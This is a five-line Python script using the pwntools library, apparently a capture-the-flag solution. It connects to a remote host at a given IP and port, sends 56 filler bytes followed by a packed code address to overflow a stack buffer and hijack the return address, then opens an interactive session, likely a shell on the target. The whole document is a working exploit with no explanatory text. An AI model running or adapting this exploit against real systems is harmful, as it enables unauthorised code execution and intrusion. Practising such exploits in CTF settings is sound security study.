from pwn import *
r = remote('140.110.112.192','2118')
r. recvuntil(':')
r.sendline('a'*56+p64(0x004006b6))
r.interactive()
